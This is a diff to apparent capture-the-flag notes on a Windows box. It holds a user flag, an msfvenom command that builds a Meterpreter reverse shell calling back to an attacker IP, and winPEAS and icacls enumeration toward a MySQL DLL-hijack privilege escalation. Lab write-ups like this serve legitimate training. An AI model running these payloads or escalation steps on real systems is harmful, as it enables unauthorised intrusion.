@@ -64,8 +64,6 @@ in desktop is user.txt
 
 user flag -> f149f63bbc26a07d9c6eba3b9b44e898
 
-
-
 access
 
 msfconsole -q
@@ -79,3 +77,121 @@ run
 pyload generator
 
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.108 LPORT=9001 -f exe -o meterpreter.exe
+
+
+Privilege escalation:
+
+uoload ~/path/WinPeas.exe
+
+run winPEAS.exe > C:\\Users\\Public\\winpeas.txt
+
+exit
+
+download C:\\Users\\Public\\winpeas.txt
+
+in winpeas out I found
+
+```
+ Interesting Services -non Microsoft- (T1007)
+<C8> Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
+    MySQL80(Oracle Corporation - MySQL 8.0)[C:\MySQL\bin\mysqld.exe --defaults-file=C:\MySQL\my.ini MySQL80] - Auto - Running - No quotes and Space detected
+    File Permissions: Authenticated Users [Allow: WriteData/CreateFiles]
+    Possible DLL Hijacking in binary folder: C:\MySQL\bin (Authenticated Users [Allow: WriteData/CreateFiles])
+```
+
+
+Cualquier usuario autenticado (incluido KioskUser) puede escribir archivos dentro de C:\MySQL\bin.
+Esto abre varias posibilidades de privilege escalation, especialmente porque MySQL suele correr como SYSTEM.
+
+
+
+# Permisos de la carpeta bin
+icacls "C:\MySQL\bin"
+
+icacls "C:\MySQL\bin"
+C:\MySQL\bin BUILTIN\Administrators:(I)(OI)(CI)(F)
+             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+             BUILTIN\Users:(I)(OI)(CI)(RX)
+             NT AUTHORITY\Authenticated Users:(I)(M)
+             NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
+
+# Permisos de la carpeta de plugins (muy importante)
+icacls "C:\MySQL\lib\plugin"
+
+icacls "C:\MySQL\lib\plugin"
+C:\MySQL\lib\plugin BUILTIN\Administrators:(I)(OI)(CI)(F)
+                    NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+                    BUILTIN\Users:(I)(OI)(CI)(RX)
+                    NT AUTHORITY\Authenticated Users:(I)(M)
+                    NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
+
+dir "C:\MySQL\lib\plugin"
+dir C:\MySQL\lib\plugin
+ Volume in drive C has no label.
+ Volume Serial Number is 9B34-EFD9
+
+ Directory of C:\MySQL\lib\plugin
+
+04/04/2026  02:33 PM    <DIR>          .
+04/04/2026  02:33 PM    <DIR>          ..
+03/31/2025  04:43 AM            36,928 adt_null.dll
+03/31/2025  04:42 AM            42,088 authentication_fido_client.dll
+03/31/2025  04:42 AM         6,269,552 authentication_kerberos_client.dll
+03/31/2025  04:42 AM            54,896 authentication_ldap_sasl_client.dll
+03/31/2025  04:42 AM         6,317,160 authentication_oci_client.dll
+03/31/2025  04:43 AM            35,448 component_audit_api_message_emit.dll
+03/31/2025  04:43 AM         1,252,448 component_keyring_file.dll
+03/31/2025  04:43 AM            43,120 component_log_filter_dragnet.dll
+03/31/2025  04:43 AM            47,200 component_log_sink_json.dll
+03/31/2025  04:43 AM            28,784 component_log_sink_syseventlog.dll
+03/31/2025  04:43 AM            54,880 component_mysqlbackup.dll
+03/31/2025  04:43 AM            25,192 component_query_attributes.dll
+03/31/2025  04:43 AM            56,424 component_reference_cache.dll
+03/31/2025  04:43 AM            78,952 component_validate_password.dll
+03/31/2025  04:43 AM            56,408 connection_control.dll
+03/31/2025  04:43 AM            81,992 ddl_rewriter.dll
+04/04/2026  02:33 PM    <DIR>          debug
+03/31/2025  04:43 AM         1,997,400 group_replication.dll
+03/31/2025  04:43 AM            41,544 ha_example.dll
+03/31/2025  04:43 AM            51,264 ha_mock.dll
+03/31/2025  04:43 AM           105,032 keyring_file.dll
+03/31/2025  04:43 AM            37,448 keyring_udf.dll
+03/31/2025  04:43 AM            41,552 libpluginmecab.dll
+03/31/2025  04:43 AM            24,656 locking_service.dll
+03/31/2025  04:43 AM            25,160 mypluglib.dll
+03/31/2025  04:43 AM           153,160 mysql_clone.dll
+03/31/2025  04:43 AM            23,120 mysql_no_login.dll
+03/31/2025  04:43 AM            70,728 rewriter.dll
+03/31/2025  04:43 AM            24,656 rewrite_example.dll
+03/31/2025  04:43 AM            90,704 semisync_master.dll
+03/31/2025  04:43 AM            46,160 semisync_replica.dll
+03/31/2025  04:43 AM            46,672 semisync_slave.dll
+03/31/2025  04:43 AM            89,680 semisync_source.dll
+03/31/2025  04:43 AM            58,456 validate_password.dll
+03/31/2025  04:43 AM            62,032 version_token.dll
+              34 File(s)     17,470,896 bytes
+               3 Dir(s)   8,516,644,864 bytes free
+
+# Ver el archivo de configuración
+type C:\MySQL\my.ini
+
+C:\Users\KioskUser\Downloads>type C:\MySQL\my.ini
+type C:\MySQL\my.ini
+[mysqld]
+basedir=C:/MySQL
+datadir=C:/MySQL/data
+port=3306
+bind-address=127.0.0.1
+max_allowed_packet=256M
+innodb_buffer_pool_size=512M
+default-authentication-plugin=mysql_native_password
+character-set-server=utf8mb4
+collation-server=utf8mb4_unicode_ci
+log-error=C:/MySQL/data/mysql-error.log
+explicit_defaults_for_timestamp=1
+
+[client]
+port=3306
+default-character-set=utf8mb4
+
+
